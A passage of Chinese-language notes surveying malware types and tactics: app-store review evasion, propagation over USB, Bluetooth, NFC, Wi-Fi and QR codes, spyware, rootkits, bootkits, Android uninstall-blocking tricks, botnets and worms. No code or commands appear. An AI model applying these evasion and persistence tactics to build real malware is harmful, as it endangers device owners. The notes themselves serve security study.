在应用商店审核期间，服务器可以指令应用程序执行正常行为；而在用户安装后，服务器则可以指令应用程序执行恶意行为。\n\n实现： 使用C&amp;C服务器 (Command and Control Server)进行远程控制。\n\n\n\n加壳（Packing）：\n\n原理： 使用加壳工具对应用程序的安装包进行加密或压缩，使得安装包难以分析。\n\n作用： 增加恶意代码分析的难度，使得应用商店的检测工具难以识别恶意行为。\n\n原理: 在原有的程序外层加一个保护壳。加壳后的程序在运行时，会先运行加壳程序，然后由加壳程序负责解密原始程序，并将控制权转交给原始程序\n\n\n\n白名单（Whitelisting）：\n\n原理： 恶意代码只会针对特定的用户或设备执行，而对应用商店的审核人员则执行正常行为。\n\n作用： 使得应用商店的审核人员难以发现恶意行为。\n\n实现： 使用设备信息、地理位置信息、IP 地址等来进行白名单判断。\n\n\n\n社会工程学（Social Engineering）：\n\n原理： 将恶意应用程序伪装成合法的应用程序，例如：游戏、工具、壁纸等，诱骗用户下载。\n\n作用： 使得用户放松警惕，主动下载恶意应用程序。\n\n实现： 使用精美的应用图标、诱人的应用名称、虚假的用户评论等。\n\n\n\n利用合法功能：\n\n原理： 恶意应用程序使用应用程序的合法功能，来实现恶意目的。\n\n作用： 使得应用商店难以区分应用程序的合法行为和恶意行为。\n\n实现： 例如：使用 Accessibility Service 读取用户屏幕信息、使用DownloadManager 下载恶意代码、使用BroadcastReceiver监听系统事件等。\n\n\n\n漏洞利用：\n\n原理： 恶意应用程序利用应用商店的审核系统的漏洞，绕过审核。\n\n作用： 使得恶意应用可以成功上架到应用商店。\n\n\n\n购买应用：\n\n原理： 恶意软件开发者会收购一些合法应用，然后通过更新的形式，注入恶意代码。\n\n作用： 利用用户对已安装应用的信任，来获取权限，并执行恶意代码。\n\n\n\n\n设备传播usb，蓝牙，NFC，wifi，QR扫码1. USB 传播：\n\n传播路径：\n\n恶意软件植入： 恶意软件首先需要被植入到USB存储设备中，这可以通过多种方式实现：\n\n人工感染： 攻击者手动将携带恶意软件的文件复制到USB设备中。\n\n自动感染： 攻击者利用受感染的计算机，当USB设备插入计算机时，恶意软件自动复制到USB设备中。\n\n供应链攻击： 攻击者控制USB设备的生产商，将恶意软件预装到USB设备中。\n\n\n\n设备插入： 用户将受感染的USB设备插入计算机或移动设备中。\n\n自动执行： 如果目标系统启用了自动播放功能，或者用户手动执行了USB设备中的恶意文件，恶意软件将被激活。\n\n感染和传播： 恶意软件在目标系统上执行，并开始进行各种恶意操作，例如：窃取数据、安装后门、传播自身到其他USB设备或网络中。\n\n\n\n传播方法：\n\n利用自动播放： 恶意软件通常会利用Windows等系统的自动播放功能，当用户插入USB设备时，恶意软件自动执行。\n\n伪装成合法文件： 恶意软件会伪装成合法的文件，例如：图片、文档、视频等，诱骗用户手动执行。\n\nLNK文件漏洞： 恶意软件会利用LNK文件漏洞，在用户点击LNK文件时执行恶意代码。\n\n隐藏恶意文件： 恶意软件会使用隐藏属性，隐藏恶意文件，让用户难以发现。\n\n\n\n所需权限：\n\n读取和写入文件： 需要读取和写入USB设备上的文件。\n\n执行程序： 需要执行恶意程序。\n\n系统权限： 可能需要系统权限来进行更深层次的恶意操作， 例如 修改注册表， 安装系统服务等。\n\nAndroid权限： 需要 READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE 等权限来访问USB设备，如果涉及到执行恶意代码，可能需要更高的权限。\n\n\n\n相关资料：\n\nhttps://www.kaspersky.com.cn/about/press-releases/usb-drives\n\n\n\n2. 蓝牙传播：\n\n传播路径：\n\n恶意软件蓝牙传播： 恶意软件需要具有蓝牙传播能力，例如：蓝牙蠕虫。\n\n设备配对： 攻击者利用漏洞或社会工程学，使目标设备与攻击者的设备配对。\n\n文件传输： 恶意软件通过蓝牙文件传输协议，将自身发送到目标设备。\n\n执行： 目标设备接收到恶意文件后，用户如果执行该文件，则会激活恶意软件。\n\n感染和传播： 恶意软件在目标设备上执行，并开始进行各种恶意操作，例如：窃取数据、安装后门、传播自身到其他蓝牙设备或网络中。\n\n\n\n传播方法：\n\n利用蓝牙漏洞： 恶意软件会利用蓝牙协议漏洞，自动进行设备配对和文件传输。\n\n伪装成合法文件： 恶意软件会伪装成合法的文件，例如：图片、音频等，诱骗用户手动执行。\n\n蓝牙服务漏洞： 攻击者可以利用蓝牙服务漏洞来获取设备权限。\n\n\n\n所需权限：\n\n蓝牙权限： 需要蓝牙权限进行设备配对、文件传输。\n\n执行程序： 需要执行恶意程序。\n\n系统权限： 可能需要系统权限来进行更深层次的恶意操作。\n\nAndroid权限： 需要 BLUETOOTH, BLUETOOTH_ADMIN 等权限。\n\n\n\n\n3. NFC 传播：\n\n传播路径：\n\n恶意NFC标签： 攻击者将恶意软件的信息写入NFC标签中。\n\n设备接触： 用户将设备靠近恶意NFC标签，触发NFC读取。\n\n恶意内容读取： 设备读取NFC标签中的恶意信息， 例如：恶意URL，恶意应用下载链接。\n\n恶意执行： 设备跳转到恶意网站、下载恶意应用程序，用户如果执行这些恶意操作，则会激活恶意软件。\n\n感染和传播： 恶意软件在目标设备上执行，并开始进行各种恶意操作。\n\n\n\n传播方法：\n\n恶意URL： NFC标签中包含恶意URL，当用户读取标签时，浏览器会自动打开恶意网址。\n\n恶意应用下载： NFC标签中包含恶意应用的下载链接，当用户点击链接时，会自动下载恶意应用。\n\n利用NFC漏洞： 恶意软件会利用NFC协议漏洞，自动执行恶意代码。\n\n社交工程学： 攻击者可以利用社会工程学来诱骗用户去扫描NFC标签。\n\n\n\n所需权限：\n\nNFC权限： 需要NFC权限进行NFC读取。\n\n网络权限： 如果NFC读取的结果是网址，那么需要网络权限进行浏览。\n\n文件下载： 如果NFC读取的结果是应用下载，那么需要下载权限。\n\n系统权限： 可能需要系统权限来进行更深层次的恶意操作。\n\nAndroid权限： 需要 NFC 权限。\n\n\n\n示例软件：\n\nNGate：NGate Android 恶意软件中继 NFC 流量以窃取现金:https://www.welivesecurity.com/en/eset-research/ngate-android-malware-relays-nfc-traffic-to-steal-cash/\n\n\n\n4. Wi-Fi 传播：\n\n传播路径：\n\n恶意Wi-Fi热点： 攻击者创建一个恶意Wi-Fi热点，诱骗用户连接。\n\n流量劫持： 当用户连接到恶意Wi-Fi热点时，攻击者可以劫持用户的网络流量。\n\n中间人攻击： 攻击者可以拦截用户的网络请求，修改用户的网页，或者注入恶意代码。\n\n恶意下载： 当用户访问网页时，攻击者可以使用中间人攻击技术，将恶意软件下载到用户的设备上。\n\n感染和传播： 恶意软件在目标设备上执行，并开始进行各种恶意操作。\n\n\n\n传播方法：\n\n中间人攻击： 攻击者利用中间人攻击技术，拦截用户的网络流量，注入恶意代码。\n\nDNS劫持： 攻击者利用DNS劫持技术，将用户重定向到恶意网站。\n\n恶意软件传播： 在用户的设备上植入恶意软件， 并传播给网络中的其他设备。\n\n恶意软件传播： 当设备连接到恶意WIFI的时候，会将恶意软件自动下载到设备上。\n\n钓鱼： 攻击者可以利用钓鱼网站，诱骗用户输入账号密码等信息。\n\n\n\n所需权限：\n\n网络权限： 需要网络权限进行Wi-Fi连接和数据传输。\n\n文件下载： 需要下载权限，下载恶意软件。\n\n系统权限： 可能需要系统权限来进行更深层次的恶意操作。\n\nAndroid权限： 需要 ACCESS_WIFI_STATE, CHANGE_WIFI_STATE, INTERNET 等权限。\n\n\n\n\n5. QR 码传播：\n\n传播路径：\n\n恶意QR码： 攻击者生成一个包含恶意信息的QR码。\n\n设备扫描： 用户使用移动设备扫描恶意QR码。\n\n恶意URL： 恶意QR码包含恶意URL，当用户扫描QR码时，浏览器会自动打开恶意网址。\n\n恶意下载： 用户如果点击恶意网址，可能会下载恶意软件。\n\n恶意信息展示： 恶意QR码可能包含恶意文本信息或者链接，诱导用户输入账号密码等信息。\n\n感染和传播： 恶意软件在目标设备上执行，并开始进行各种恶意操作。\n\n\n\n传播方法：\n\n恶意URL： QR码中包含恶意URL，当用户扫描QR码时，浏览器会自动打开恶意网址。\n\n恶意应用下载： QR码中包含恶意应用的下载链接，当用户点击链接时，会自动下载恶意应用。\n\n社交工程学： 攻击者会把恶意二维码伪装成各种信息来诱骗用户进行扫描。\n\n\n\n所需权限：\n\n摄像头权限： 需要摄像头权限进行QR码扫描。\n\n网络权限： 如果QR码扫描的结果是网址，那么需要网络权限进行浏览。\n\n文件下载： 如果QR码扫描的结果是应用下载，那么需要下载权限。\n\nAndroid权限： 需要 CAMERA 权限。\n\n\n\n\n应用广告（弹窗)广告（弹窗）类型：\n 根据技术实现分类（Android 特有）：\n\nActivity 弹窗：\n\n使用 Android 的 Activity 组件实现的弹窗。\n\n具有较高的灵活性和自定义能力，可以实现复杂的动画效果和交互逻辑。\n\n\n\nDialog 弹窗：\n\n使用 Android 的 Dialog 组件实现的弹窗。\n\n比较轻量级，适用于显示简单的提示信息或确认对话框。\n\n\n\nNotification 弹窗：\n\n使用 Android 的 NotificationManager 实现的弹窗，通常显示在通知栏中。\n\n可以显示各种通知信息，例如消息、提醒或进度。\n\n\n\nSYSTEM_ALERT_WINDOW 弹窗：\n\n使用 SYSTEM_ALERT_WINDOW权限在其他应用之上绘制的浮窗，常用于显示广告。\n\n可以覆盖其他应用界面，比较具有侵入性。\n\n\n\n\n恶意类型：\n恶意广告主：\n\n一些恶意广告主会投放恶意广告，如包含恶意代码、链接的广告，诱导用户点击，从而感染恶意软件或进行网络钓鱼。\n\n恶意广告主可能使用欺诈手段，例如，点击欺诈、展示欺诈等，骗取广告费用。\n\n通过恶意广告SDK传播恶意软件: 恶意广告主可能会使用恶意的广告SDK（软件开发工具包），在合法的广告中植入恶意代码，从而传播恶意软件。\n\n\n\n恶意发布商：\n\n一些恶意发布商会通过各种手段欺骗广告联盟，例如，刷流量、伪造用户数据，从而骗取广告收入。 攻击者使用机器人或其他自动化方式人为地增加广告的点击次数。这会耗尽广告商的预算，而不会产生真正的潜在客户或转化。\n\n这可能包括点击垃圾 (来自虚假用户的多次点击) 和广告堆叠 (多个广告层层叠加，当用户只点击一次时，所有广告都记录点击)。\n\n恶意发布商可能会在其广告位上展示恶意广告，给用户带来风险。\n\n恶意发布商也可能会利用漏洞或后门，在用户的浏览器或设备上安装恶意软件。\n\n\n\n无限弹窗消耗资源并导致程序崩溃\n\n植入恶意代码（webView)\n\n点击欺诈\n\n\n广告联盟\n广告跟踪与数据收集：\n\n广告联盟会跟踪广告的展示、点击、转化等数据，以评估广告效果。\n\n广告联盟会收集用户的行为数据，如浏览历史、搜索记录、兴趣爱好等，以便更精准地投放广告。\n\n广告联盟使用各种跟踪技术，例如：\n\nCookie： 在用户浏览器中存储的小型文本文件，用于跟踪用户行为。\n\nPixel： 嵌入在网页中的一小段代码，用于跟踪用户的浏览行为。\n\n移动广告ID： 在移动设备上用于跟踪用户行为的唯一标识符。\n\n服务器端跟踪： 通过服务器端记录用户的行为数据，相比客户端跟踪，更加可靠和精准。\n\n\n\n\n\n广告结算：\n\n广告主根据广告效果向广告联盟支付广告费用。\n\n广告联盟会根据合同约定将广告收入分给发布商。\n\n广告结算通常采用以下几种方式：\n\nCPM (Cost Per Mille)： 按广告展示次数收费（每千次展示）。\n\nCPC (Cost Per Click)： 按广告点击次数收费。\n\nCPA (Cost Per Action)： 按用户完成特定行为（如注册、购买）收费。\n\n\n\n\n\n\n绕过广告拦截器利用白名单、修改广告代码、使用混淆技术\n广告软件示例：\n\nFireball— Fireball 在2017上成为头条新闻，当时一家以色列软件公司发现全球 2.5 亿台计算机和五分之一的企业网络感染了它。如果 Fireball 感染了您的计算机，它会接管您的浏览器。它会将您的主页更改为虚假搜索引擎 Trotus，并在您访问的任何网页中插入扎眼的广告。它还可以防止您修改浏览器设置。\nAppearch – Appearch是另一种常见的广告软件程序，充当浏览器劫持者。它通常与其他免费软件捆绑在一起，会在浏览器中插入众多广告，让网页浏览变得非常困难。当尝试访问一个网站时，您会被带到 Appearch.info。如果您设法打开网页，Appearch 会将随机文本块转换为链接，因此当您选择文本时，弹出窗口会邀请您下载软件更新。\n\n勒索加密用户的数据，使其无法访问，从而迫使用户支付赎金。锁屏，无法访问\n勒索软件示例：\n\nCryptoLocker 在 2013 年和 2014 年肆虐流行，网络犯罪分子用它来访问和加密系统上的文件。网络犯罪分子使用社交工程策略诱骗员工将勒索软件下载到计算机上，从而感染网络。下载后，CryptoLocker 将显示一条赎金消息，如果在规定的截止日期之前进行现金或比特币付款，他们将解密数据。虽然 CryptoLocker 勒索软件已被打掉，但据信其操作者从毫无戒心的组织那里勒索了大约三百万美元。\nPhobos 恶意软件 — 2019 年出现的一款勒索软件。这种勒索软件基于以前已知的 Dharma（又名 CrySis）勒索软件系列。\n\n勒索软件即服务 (Raas)间谍（窃取信息）行为：记录键盘输入（键盘记录器）、捕获屏幕截图、监视浏览历史或窃取密码和信用卡信息。常用于广告定向、个人信息窃取或监视用户活动。\n读取联系人、短信和通话记录： 这是恶意软件最常见的行为之一，用于收集用户的个人信息，并可能用于钓鱼诈骗或其他恶意活动。\n窃取设备上的照片、视频和音频文件： 录音和视频间谍软件可以使用您的设备录制您的对话，并将信息发送给第三方。某些智能手机应用需要访问笔记本电脑或智能手机的摄像头和麦克风；此权限可能被用于随时录制您的声音影像，在您不知情的情况下上传照片和声音，将您的摄像头画面向互联网直播，以及对您的面部运行人脸识别软件。\n获取设备的地理位置信息： 恶意软件可以跟踪用户的行踪，可能用于广告定向或其他恶意目的。\n读取剪贴板内容： 恶意软件可能窃取用户复制到剪贴板上的敏感信息，如密码、银行卡号等。\n收集应用列表和使用数据： 恶意软件可能收集用户安装的应用列表和使用习惯，以便进行更精准的攻击或广告定向。\n键盘记录： 记录用户在键盘上输入的任何内容，包括密码、账号等敏感信息。\n间谍软件示例：\n\nCoolWebSearch– 该程序利用 Internet Explorer 中的安全漏洞劫持浏览器、更改设置并将浏览数据发送给其作者。\nGator – 该程序通常与文件共享软件（如 Kazaa）捆绑在一起，监控受害者的网上冲浪习惯，使用这些信息为他们提供特定的广告。\n\n相关文章：\n\nAudioGuard ：基于每个进程控制麦克风访问：https://0mwindybug.github.io/AudioGuard/\n保护 Android 剪贴板内容免遭意外暴露:https://www.microsoft.com/en-us/security/blog/2023/03/06/protecting-android-clipboard-content-from-unintended-exposure/\n\nPUP 恶意软件（捆绑下载）PUP 的传播方式诱导用户安装的方法\nPUP 恶意软件示例：\n\nMindspark 恶意软件 – 这是一个易于安装的 PUP ，在用户不注意的时候下载到用户的机器上。Mindspark 可以在用户不知情的情况下更改设置并触发设备上的行为。它出了名的难以消除。\n\n远程控制 rootkithttps://www.kaspersky.com.cn/resource-center/definitions/what-is-rootkitAndroid 平台上的 Rootkit\n\n定义： Android 平台上的 Rootkit 是一种恶意软件，旨在隐藏其在 Android 系统中的存在，并允许攻击者保持对受感染设备的访问权限。\n\n类型：\n\n用户模式 Rootkit:\n\n表现： 在用户模式下运行，通常以应用的形式出现，并利用 Hook 技术隐藏自身。\n\n攻击： 可以隐藏恶意应用图标，劫持系统 API，窃取用户数据。\n\n检测： 相对容易被检测，可以通过应用管理器、安全软件等进行检测。\n\n\n\n内核模式 Rootkit:\n\n表现： 在内核模式下运行，通过修改内核代码或驱动程序来隐藏恶意行为。\n\n攻击： 可以直接控制系统资源、绕过权限检查、实现持久化。\n\n检测： 难以检测，需要专门的内核调试工具和安全分析技术。\n\n\n\n基于 Xposed 或 Magisk 模块的 Rootkit:\n\n表现： 利用 Xposed 或 Magisk 框架，注入恶意模块，从而控制系统。\n\n攻击： 可以修改系统行为，劫持应用 API，进行各种恶意操作。\n\n检测： 依赖于 Xposed 或 Magisk 的检测工具，可以被用户卸载。\n\n\n\n\n\n攻击方式:\n\nHooking: 修改系统API，拦截或修改系统调用，例如hook open、read、write等API，从而隐藏恶意行为。\n\n隐藏恶意文件和进程： 修改文件系统、进程列表等，使得恶意文件和进程在系统中不可见。\n\n修改系统配置文件： 修改 build.prop、init.rc 等配置文件，以实现持久化或隐藏自身。\n\n利用漏洞： 利用 Android 系统的漏洞进行权限提升或绕过安全机制。\n\n伪装成正常应用： 将 Rootkit 伪装成正常应用，诱骗用户安装。\n\n\n\n恶意行为:\n\n窃取用户数据： 窃取短信、联系人、通话记录、位置信息、照片、视频等敏感信息。\n\n监控用户活动： 记录键盘输入、屏幕截图、通话录音等。\n\n修改系统设置： 禁用安全功能、修改 DNS 设置、更改网络代理等。\n\n进行广告欺诈： 在后台弹出广告、进行点击欺诈、流量欺诈等。\n\nDDoS攻击： 将受感染的设备变成僵尸网络的一部分，用于发动 DDoS 攻击。\n\n\n\n\n实际例子：\n\n\n相关软件&#x2F;工具\n\n\nProcess Hacker: 用于查看、调试、管理 Windows 进程的工具。\n\n用途： 可以查看隐藏进程、模块信息，分析进程行为。\n\n\nSysinternals Suite: 微软官方发布的一系列系统工具，用于系统分析和调试。\n\n用途： 包含 Process Monitor、Process Explorer 等工具，可以用于查看进程、文件、注册表、网络活动等。\n\n\nIDA Pro&#x2F;Ghidra: 用于反编译、调试、分析软件的工具。\n\n用途： 可以分析恶意代码，找到 Rootkit 的隐藏功能。\n\n\nAndroid Debug Bridge (ADB): Android 开发工具，可以用于调试 Android 设备。\n\n用途： 调试 Android 系统，提取恶意软件信息。\n\nXposed&#x2F;Magisk： Android 框架，可以用于注入代码和修改系统行为。\n\n用途： Xposed 和 Magisk 既可以被用于开发有用的模块，也可能被恶意软件开发者利用。\n\n\n\n\n\n\n实际利用例子\n\nZeroAccess Rootkit: 一种 Windows 内核模式 Rootkit，用于生成点击欺诈流量。\n\nSony BMG Rootkit: Sony BMG 公司在其音乐 CD 中安装的 Rootkit，用于阻止用户复制音乐，但也带来了安全风险。\n\nPegasus Spyware: NSO Group 开发的间谍软件，可以使用多种 Rootkit 技术来感染 Android 和 iOS 设备，并窃取用户数据。\n\nGooligan: 一种安卓 Rootkit，利用旧安卓版本的漏洞来获取 root 权限，安装恶意软件并窃取用户数据。\n\n\n\n\nBootkits一种感染 MBR（主引导记录）的 rootkit，它允许在操作系统启动之前加载恶意软件\n\n破坏操作系统的启动过程。\n\n感染 MBR (主引导记录)或 UEFI。\n\n在操作系统启动之前加载恶意软件。\n\n难以被检测和清除。\n\n\nAndroid 平台上的 Bootkit\n\n定义： Android 平台上的 Bootkit 是一种恶意软件，旨在感染 Android 设备的启动过程，通常是在内核加载之前，从而在系统启动的早期就获得控制权。\n\n类型:\n\nBootloader Bootkit:\n\n表现: 感染Bootloader，可以完全控制设备的启动过程。\n\n攻击: 可以修改内核、驱动等，实现持久化、绕过安全机制。\n\n检测: 非常难以检测，需要刷机、硬件调试等手段。\n\n\n\nKernel Bootkit:\n\n表现: 感染 Android 内核，通常以内核模块的形式存在。\n\n攻击: 可以直接控制系统资源、绕过安全机制、修改系统行为。\n\n检测: 难以检测，需要专门的内核调试工具和安全分析技术。\n\n\n\nRecovery Image Bootkit:\n\n表现: 感染Recovery镜像，在设备进入Recovery模式时运行。\n\n攻击: 可以修改系统分区、安装恶意软件、擦除用户数据等。\n\n检测: 难以检测，需要检查Recovery镜像文件。\n\n\n\n\n\n攻击方式:\n\n感染Bootloader: 修改 Bootloader 代码，使其在启动时加载恶意代码。\n\n替换内核： 替换 Android 内核，使其加载恶意驱动或模块。\n\n修改 init 进程： 修改 init 进程，使其在系统启动时执行恶意代码。\n\n修改 recovery 镜像： 修改 recovery 镜像，使其在设备进入 recovery 模式时执行恶意代码。\n\n利用漏洞: 利用Bootloader、内核、驱动等漏洞，直接植入Bootkit。\n\n\n\n恶意行为:\n\n持久化： 确保恶意软件在系统重启、恢复出厂设置后仍然可以运行。\n\n绕过安全启动： 禁用安全启动机制，从而加载恶意内核或驱动程序。\n\n控制设备： 控制 Android 设备的启动过程、操作系统、硬件资源等。\n\n窃取用户数据： 在系统启动的早期窃取用户数据，例如账号密码、银行卡信息等。\n\n破坏系统： 修改系统文件、破坏启动流程等，导致系统无法正常运行。\n\n安装恶意软件： 在系统启动时安装恶意应用，绕过应用商店的审核。\n\n远程控制： 在系统启动时建立后门，允许攻击者远程控制设备。\n\n\n\n\n\n\nUEFI Bootkit:\n\n功能: 感染 UEFI 固件，在操作系统加载之前运行。\n\n说明: 由于 UEFI 代码的复杂性，我无法直接提供一个可运行的代码示例。UEFI Bootkit通常需要编写复杂的 UEFI 驱动程序、hook UEFI 服务、操作 UEFI 变量等技术。下面是简化的流程：  1. 获取 UEFI 固件访问权限: 通过漏洞、恶意更新或供应链攻击等方式获取。  2. 注入恶意模块: 在 UEFI 固件中植入恶意模块，使其在系统启动时运行。  3. 控制启动流程: 修改启动流程，加载恶意内核或驱动。  * 实际案例:\n\nHacking Team UEFI Rootkit: 意大利公司 Hacking Team 开发的 UEFI Rootkit，用于监视目标用户。\n\nLoJax UEFI Rootkit: APT28 (Fancy Bear) 使用的 UEFI Bootkit，用于持久化攻击，针对政府和国防机构。\n\n\n\n\n\nMBR Bootkit\n\n原理： 将恶意代码写入 MBR (主引导记录) 的前 512 字节，从而在系统启动时执行。\n\n实际案例： TDL3 (Alureon) Bootkit: 一种感染 MBR 的 Bootkit，用于劫持 DNS 服务器，传播恶意软件，2010 年左右流行。\n\n\n\n相关软件&#x2F;工具\n\nUEFITool: 用于分析、修改 UEFI 固件的工具。\n\n用途： 可以查看 UEFI 固件的结构，提取固件模块，分析固件漏洞，修改固件配置。\n\n注意： UEFITool 既可以用于安全研究，也可能被恶意软件开发者滥用。\n\n\n\nIntel System Debugger (ISD): 用于调试、分析 Intel 平台的固件和操作系统。\n\n用途： 调试固件代码，分析固件漏洞，跟踪系统启动过程。\n\n注意： ISD是一个强大的调试工具，可以被安全研究人员和攻击者使用。\n\nChipsec: 用于分析、审计 UEFI 安全配置的工具。\n\n用途： 检测 UEFI 固件中的安全漏洞，分析系统安全策略。\n\nVirtualBox&#x2F;VMware： 可以创建虚拟机来测试 Bootkit 代码，避免在真实硬件上造成损害。\n\n用途： 在虚拟机中运行模拟环境，测试恶意代码，调试系统启动过程。\n\n注意： 确保虚拟机环境的安全，防止恶意代码逃逸。\n\n\n\n实际利用例子\n\nFinSpy (FinFisher): 一种商业间谍软件，使用 Bootkit 来实现持久化，并监控目标设备。\n\nEquation Group 的固件植入: 美国国家安全局（NSA）下属的黑客组织 “方程式组织” 使用固件植入技术，包括 Bootkit，进行网络间谍活动。\n\nDarkhotel APT: 该组织利用 UEFI Bootkit 对酒店网络中的目标计算机进行攻击。\n\n\n\n\nRAT远程访问木马或远程访问工具。用于为攻击者提供对系统的完全控制权。通常带有键盘记录器。\n\nRAT可以提供攻击者完全控制受感染的设备。\n\n通常包含键盘记录器、屏幕截图功能、文件管理功能等。\n\n可以通过多种方式传播，例如电子邮件、恶意网站、软件漏洞等。\n\n\n阻止卸载卸载时发生了什么：1.系统处理卸载请求：\n\nPackageManagerService： 当用户触发卸载操作后，系统会通过 PackageManagerService (Android包管理服务)来处理卸载请求。\n\n权限检查： PackageManagerService 会检查用户是否有卸载该应用的权限（例如：设备管理员权限）。\n\n进程停止： 系统会强制停止该应用的所有进程，包括前台进程、后台服务、定时任务等。\n\n广播： 系统会发送 ACTION_PACKAGE_REMOVED 广播，通知其他应用程序，某个应用已经被卸载。\n\n数据删除： 系统会删除该应用的所有数据， 例如 应用的缓存， 数据库，SharedPreferences等。\n\n\n2. 系统删除应用文件：\n\nAPK文件删除： 系统会删除该应用的APK文件，以及与该应用相关的所有文件。\n\n数据目录删除： 系统会删除该应用的数据目录。\n\n缓存文件删除： 系统会删除该应用的缓存文件。\n\n\n3. 清理残留信息：\n\n清理注册表： 系统可能会清理注册表中该应用的相关信息。\n\n清理缓存： 系统会清理其他缓存文件中该应用的相关信息。\n\n\n检测卸载：应用本身并不知道自己何时被卸载，因为卸载操作是由系统执行的。 但是，应用可以通过以下方式来检测到自身被卸载：\n\nACTION_PACKAGE_REMOVED 广播： 系统在卸载应用后，会发送 ACTION_PACKAGE_REMOVED 广播，其他应用可以注册这个广播来监听应用的卸载事件。\n\nDeviceAdminReceiver： 如果应用注册了设备管理员权限，应用可以通过 onDisabled() 方法接收到设备管理员被禁用的事件， 这通常意味着用户已经卸载了该应用。\n\n自定义Service： 应用可以通过注册一个系统服务，监听系统的包管理变化，如果发现自身被卸载，则执行相应操作。\n\n定时任务： 应用可以通过定时任务来检测自身是否仍然存在，如果发现自身已经被卸载，则执行相应操作。\n\nSharedPreference： 如果应用卸载后又被重新安装，那么SharedPreferences 会被重置。应用可以通过这个来判断自己是不是被卸载后又重新安装的。\n\n检查安装目录： 如果应用程序发现自身的安装目录不存在，则可以判断自己已经被卸载。\n\n使用 Native 代码： 应用程序可以利用Native代码，进行更底层的检测，例如检测系统进程、检测系统文件， 从而判断自己是否被卸载。\n\n云端检测： 应用程序可以通过云端服务器来检测自身是否仍然安装在用户设备上， 如果云端服务器检测到设备上不再存在该应用， 则表明应用已经被卸载。\n\n\n阻止卸载\n设备管理员权限 (Device Admin)：\n\n恶意软件会诱导用户授予其设备管理员权限，一旦获得该权限，恶意软件可以控制设备的卸载过程。\n\n恶意软件可以通过 onDisableRequested() 方法，在用户尝试禁用设备管理员权限时，弹出自定义弹窗，诱导用户不卸载该应用。\n\n恶意软件可以通过 onDisabled() 方法，在设备管理员权限被禁用时，执行恶意操作，例如 重复申请权限，重新激活自身， 强制重启等。\n\n\n\n覆盖攻击： 恶意软件可以使用 SYSTEM_ALERT_WINDOW 权限，在卸载界面上创建一个透明的覆盖层，当用户点击卸载按钮时，实际上是点击了恶意软件的按钮。\n\n点击劫持： 恶意软件可以使用点击劫持，把正常的卸载按钮放在透明层之下， 当用户点击透明层时，实际上点击了正常的卸载按钮。\n\n伪造卸载界面： 恶意软件可以伪造一个卸载界面，看起来像是系统的卸载界面，实际上用户并没有真正卸载恶意软件。\n\n阻止卸载按钮： 恶意软件可以通过各种技术手段，阻止用户点击卸载按钮， 例如通过 AccessibilityService 来阻止点击事件， 或者通过root权限 修改系统文件来实现。\n\n设置卸载密码： 恶意软件可能会设置一个卸载密码，阻止用户直接卸载该应用。\n\n\n僵尸网络由受感染计算机组成的网络，这些计算机在攻击者的控制下执行恶意活动，可以用于发送垃圾邮件、发起DDoS攻击、传播恶意软件等。将其作为肉鸡来挖矿\n僵尸网络示例：\n\n仙女座恶意软件 – 仙女座僵尸网络与 80 个不同的恶意软件家族相关联。它的范围甚广，一度 每月感染一百万台新机器，通过社交媒体、即时消息、垃圾邮件、漏洞利用工具包等传播自己。该行动在 2017 年被联邦调查局、欧洲刑警组织的欧洲网络犯罪中心等破获，但许多个人电脑继续受到感染。\nMirai — 2016年，一场大规模的 DDoS 攻击导致美国东海岸大部分地区无法上网。当局最初担心这次袭击是一个敌对国家干的，后来发现是由 Mirai 僵尸网络引起的。Mirai 是一种自动发现物联网 (IoT) 设备感染并将其征入僵尸网络的恶意软件。从那里，这支 IoT 大军可以用来发起 DDoS 攻击，在攻击中，大量的垃圾流量用恶意流量淹没目标服务器。 Mirai 今天仍继续制造麻烦。\n\n数据包嗅探器恶意目的：\n\n窃取敏感信息：\n\n账号密码： 恶意软件可以嗅探网络中的数据包，截获用户输入的账号密码，例如：HTTP协议传输的账号密码。\n\n信用卡信息： 恶意软件可以嗅探网络中的数据包，截获用户输入的信用卡信息。\n\n聊天记录： 恶意软件可以嗅探网络中的数据包，截获用户的聊天记录，例如：IM协议传输的聊天记录。\n\n电子邮件： 恶意软件可以嗅探网络中的数据包，截获用户的电子邮件内容。\n\n其他敏感信息： 恶意软件可以嗅探网络中的数据包，截获其他敏感信息， 例如： 银行信息， 个人身份信息等。\n\n\n\n中间人攻击（Man-in-the-Middle Attack）：\n\n流量劫持： 攻击者可以利用数据包嗅探器，劫持用户的网络流量，例如：将用户重定向到恶意网站。\n\n数据篡改： 攻击者可以利用数据包嗅探器，拦截和修改网络中的数据包，从而篡改用户的网页内容或数据传输。\n\n注入恶意代码： 攻击者可以利用数据包嗅探器，在网络数据包中注入恶意代码。\n\n\n\n网络侦察（Network Reconnaissance）：\n\n扫描网络： 攻击者可以利用数据包嗅探器，扫描网络中的设备和开放端口，从而了解网络的拓扑结构和设备信息。\n\n识别漏洞： 攻击者可以利用数据包嗅探器，识别网络中的漏洞，例如：未加密的协议、过时的协议等。\n\n分析网络流量： 攻击者可以利用数据包嗅探器，分析网络流量的模式，从而了解用户的上网习惯和喜好。\n\n\n\n拒绝服务攻击（Denial-of-Service Attack）：\n\n大量数据包攻击： 攻击者可以利用数据包嗅探器，发送大量的数据包，耗尽目标服务器的网络带宽和处理能力，从而导致服务瘫痪。\n\n恶意数据包： 攻击者可以利用数据包嗅探器，构造恶意的数据包，发送到目标服务器，从而导致服务崩溃。\n\n\n\n协议分析：\n\n攻击者可以通过数据包嗅探器来分析某些不常见的网络协议，从而了解其工作原理， 挖掘漏洞。\n\n\n其他恶意目的：\n\nDDoS攻击： 利用被控制的设备发动DDoS攻击。\n\n植入后门： 利用嗅探到的信息来植入后门。\n\n网络钓鱼： 利用嗅探到的信息进行网络钓鱼攻击。\n\n\n\n\n木马木马示例：\n\nQbot 恶意软件也被称为 Qakbot 或Pinkslipbot，是自 2007 年以来活跃的银行木马，专注于窃取用户数据和银行凭证。恶意软件已经演化到包括新的传递机制、命令和控制技术以及反分析功能。\nTrickBot 恶意软件于 2016 年首次确定，是由老练的网络犯罪分子开发和操作的特洛伊木马。TrickBot 最初设计作为银行木马以窃取财务数据，现已演化成为模块化的多阶段恶意软件，为其操作者提供执行众多非法网络活动的全套工具。\n\n蠕虫特点是可以自行复制蠕虫示例：\n\nSQL Slammer 是一个知名的计算机蠕虫，不使用传统的分发方法。相反，它产生随机的 IP 地址并将自己发送给他们，寻找那些不受防病毒软件保护的人。它在 2003 年面世后不久，超过 75,000 台受感染的计算机在几个主要网站上不知不觉参与了 DDoS 攻击。尽管相关安全补丁已经提供了多年，但 SQL 